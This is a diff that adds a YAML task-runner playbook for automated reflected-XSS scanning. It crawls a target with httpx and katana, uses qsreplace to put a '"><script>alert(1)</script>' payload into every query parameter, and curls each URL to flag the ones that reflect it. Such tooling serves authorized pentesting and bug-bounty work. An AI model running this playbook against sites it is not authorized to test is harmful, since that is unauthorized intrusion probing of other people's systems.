@@ -1,0 +1,58 @@
+description: atomic xss playbook
+tags: xss, XSS
+params: target=CHANGEME http=1
+# Change header without blank if you need or add authorization
+env:
+  - HOME: /root/
+  - LOG_DIR: ${HOME}/logs
+  - PATH: /usr/local/bin:${PATH}
+steps:
+  - name: prepare
+    command: rm -f crwl.txt qs.txt
+
+  - name: crawl
+    command: bash
+    script: |
+      ~/go/bin/httpx -u ${target//\"} | katana -o crwl.txt
+    depends:
+      - prepare
+
+  - name: qsreplace
+    command: bash
+    script: |
+      cat crwl.txt | grep '=' | qsreplace '"><script>alert(1)</script>'
+    stdout: qs.txt
+    depends:
+      - crawl
+
+  # Converts protocols of links in gs.txt from "https" to "http"
+  # Sometimes Katana can use the wrong protocol for the provided link.
+  # To fix it, you can use this step.
+  # By entering 1 for the $http parameter, you can activate it in a run.
+  - name: protocol
+    command: bash
+    script: |
+      sed -i 's/https:/http:/g' qs.txt
+    preconditions:
+      - condition: "$http"
+        expected: "1"
+    continueOn:
+      skipped: true
+    depends:
+      - qsreplace
+
+  - name: result
+    command: bash
+    script: |
+      cat qs.txt | while read host do ; do curl -s --path-as-is --insecure "$host" | grep -qs "<script>alert(1)</script>" && echo "$host \033[0;31m" Vulnerable;done || true
+    depends:
+      - protocol
+
+  - name: cleanup
+    command: rm crwl.txt qs.txt
+    depends:
+      - result
+
+
+
+      
